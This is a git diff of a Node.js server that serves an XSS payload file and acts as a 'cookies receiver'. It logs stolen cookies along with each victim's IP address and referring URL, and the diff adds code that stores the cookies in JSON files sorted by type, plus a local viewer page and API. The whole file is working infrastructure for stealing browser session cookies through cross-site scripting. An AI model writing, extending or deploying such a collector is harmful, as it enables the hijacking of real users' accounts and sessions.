@@ -1,9 +1,11 @@
 var http = require('http');
 var fs = require('fs');
+var path = require('path');
 var url = require('url');
 var querystring = require('querystring');
+var mime = require("./mime").types;
 
-function formatDate(date, style){   
+function formatDate(date, style) {
 	var y = date.getFullYear();
 	var M = "0" + (date.getMonth() + 1);
 	M = M.substring(M.length - 2);
@@ -16,13 +18,13 @@ function formatDate(date, style){
 	var s = "0" + date.getSeconds();
 	s = s.substring(s.length - 2);
 	return style.replace('yyyy', y).replace('MM', M).replace('dd', d).replace('hh', h).replace('mm', m).replace('ss', s);
-};
+}
 
 function logIn(logContent){ //写入日志并输出控制台
 
 	var LogExist = false;
 	var files = fs.readdirSync("./");
-	for (eachfile in files)
+	for (var eachfile in files)
 	{
 		if(files[eachfile] == "Log")
 		{
@@ -39,19 +41,19 @@ function logIn(logContent){ //写入日志并输出控制台
 	
 
 	logContent = "\n"+logContent;
-	logFileName = "Log/"+formatDate(new Date,"yyyy-MM-dd")+"Log.txt"; //日志文件例子:2014-11-29Log.txt
+	logFileName = "Log/"+formatDate(new Date(),"yyyy-MM-dd")+"Log.txt"; //日志文件例子:2014-11-29Log.txt
 	fs.appendFile(logFileName,logContent, "utf-8" , function (err){
 		if (err) throw err;
-		console.log(logContent);
 	});
-};
+	console.log(logContent);
+}
 
 
 function CheckXSSjs(jsfile){
 	if(!arguments[0]) jsfile = "xss.js";
 	var JsExist = false;
 	var files = fs.readdirSync("./");
-	for (eachfile in files)
+	for (var eachfile in files)
 	{
 		if(files[eachfile] == jsfile)
 		{
@@ -65,7 +67,12 @@ function CheckXSSjs(jsfile){
 	}
 }
 
-
+function getClientIp(req) {
+	return req.headers['x-forwarded-for'] ||
+	req.connection.remoteAddress ||
+	req.socket.remoteAddress ||
+	req.connection.socket.remoteAddress;
+}
 
 function start(route,port) {
 	var ErrorOccur = false;
@@ -74,41 +81,85 @@ function start(route,port) {
 	CheckXSSjs();
 
 
-	if (isNaN(parseInt(port)))
+	if (isNaN(parseInt(port,10)))
 	{
 		console.log("请输入正确的端口号！");
 		return;
 	}
-	var Website_port = parseInt(port);	//网站所在端口号。
+	var Website_port = parseInt(port,10);	//网站所在端口号。
 
 	function onRequest(request, response) {
 		var resContent = "";
 		var pathname = url.parse(request.url).pathname;
+		var userIP = getClientIp(request);
 		if(pathname === "/favicon.ico")
 		{
-			var file_ = fs.readFileSync("./ocr_pi.png" , "binary");
-			response.writeHead(200,{'Content-Type': 'image/png'});
-			response.write(file_,"binary");
-			response.end();
+			fs.readFile("./favicon.png", "binary", function(err,data){
+				if (!err){
+					response.writeHead(200,{'Content-Type': 'image/png'});
+					response.write(data,"binary");
+					response.end();
+				}
+			});
 			return;
 		}
-		else if(pathname === "/xss")
+		else if(pathname === "/cr") //cr --> cookies receiver
 		{
 			requrl = request.url;
 			args = url.parse(request.url,true).query;
-			resContent += formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + " |Get cookie|";
-			resContent += "	Source:	"+getClientIp(request);
+			resContent += formatDate(new Date(),"yyyy-MM-dd hh:mm:ss") + " |Get cookie|";
+			resContent += "	Source:	"+userIP;
 			resContent += "	Refer:	"+requrl;
 			resContent += "	ID:	"+args.id;
 			resContent += "	Cookie:";
 			resContent += "\n"+args.cookie+"\n";
 			logIn(resContent);
+
+			var cookieType = args.tp;
+			if (!cookieType) cookieType = "unknown";
+			var cookieContent = {
+				"date":formatDate(new Date(),"yyyy-MM-dd hh:mm:ss"),
+				"source":getClientIp(request),
+				"refer":requrl,
+				"cookie":args.cookie
+			};
+			fs.exists("Cookies/"+cookieType, function(exists){
+				if (exists) {
+					fs.readFile("Cookies/"+cookieType, function(err,data){
+						if (err) throw err;
+						data = JSON.parse(data);
+						data.push(cookieContent);
+						fs.writeFile("Cookies/"+cookieType, JSON.stringify(data), "utf-8", function(err){
+							if (err) {
+								console.log("Cookie save error."+cookieType);
+								throw err;
+							}
+								
+							else console.log("Cookie received.|"+cookieType);
+						});
+					});
+				}
+				else {
+					var data = [];
+					data.push(cookieContent);
+					fs.writeFile("Cookies/"+cookieType, JSON.stringify(data), "utf-8", function(err){
+						if (err) {
+							console.log("Cookie save error."+cookieType);
+							throw err;
+						}
+							
+						else console.log("Cookie received.|"+cookieType);
+					});
+				}
+			});
+			
+			response.end();
 			return;
 		}
-		else if(pathname === "/xss.js")
+		else if(pathname === "/js")
 		{
 
-			resContent += formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
+			resContent += formatDate(new Date(),"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
 			resContent += "UA:	"+request.headers['user-agent']+ "	";
 			var file_ =  fs.readFileSync("./xss.js", "utf-8");
 			//TODO 文件读取异常处理
@@ -118,24 +169,68 @@ function start(route,port) {
 			logIn(resContent);
 			return;
 		}
-		else
-		{	
-			resContent += formatDate(new Date,"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
+		else if (pathname === "/cr/checker")
+		{
+			fs.readFile("website/index.html", function(err,data) {
+				if (err) throw err;
+				response.writeHead(200, {'Content-Type': 'text/html'});
+				response.end(data, "utf-8");
+			});
+		}
+		else if(pathname === "/api/typelist.json")
+		{
+			fs.readdir("Cookies", function(err,filesName){
+				if (userIP !== "127.0.0.1"){
+					var lol = [];
+					response.writeHead(200, {'Content-Type': 'application/json'});
+					response.end(JSON.stringify(lol), "utf-8");
+					console.log(userIP+" trying to use typelist API.");
+				}
+				if (err) throw err;
+				response.writeHead(200, {'Content-Type': 'application/json'});
+				response.end(JSON.stringify(filesName), "utf-8");
+			});
+		}
+		else //全部返回固定页面
+		{
+			if (userIP === "127.0.0.1"){
+				fs.exists("."+pathname, function (exists) {
+					if (!exists) {
+						response.writeHead(404, {'Content-Type': 'text/plain'});
+						console.log(pathname);
+						response.write("This request URL " + pathname + " was not found on this server.");
+						response.end();
+					} else {
+						fs.readFile("."+pathname, "binary", function(err, file) {
+							if (err) {
+								response.writeHead(500, {'Content-Type': 'text/plain'});
+								response.end(err);
+							} else {
+								var ext = path.extname(pathname);
+								ext = ext ? ext.slice(1) : 'unknown';
+								var contentType = mime[ext] || "text/plain";
+								response.writeHead(200, {'Content-Type': contentType});
+								response.write(file, "binary");
+								response.end();
+							}
+						});
+					}
+				});
+				return;
+			}
+			resContent += formatDate(new Date(),"yyyy-MM-dd hh:mm:ss") + " | Received "+getClientIp(request)+" requesting for: "+pathname +"	";
 			resContent += "UA:	"+request.headers['user-agent']+ "	";
 			logIn(resContent);
+			response.writeHead(200,{'Content-Type': 'text/plain'});
+			response.end("Welcome.");
 			return;
 		}
 
-		function getClientIp(req) {
-			return req.headers['x-forwarded-for'] ||
-			req.connection.remoteAddress ||
-			req.socket.remoteAddress ||
-			req.connection.socket.remoteAddress;
-	    };
+		
 
 
-		response.writeHead(200,{'Content-Type': 'text/plain'});
-		response.end("Hi! \n;D");
+		// response.writeHead(200,{'Content-Type': 'text/plain'});
+		// response.end("Hi! \n;D");
 
 	
 	}
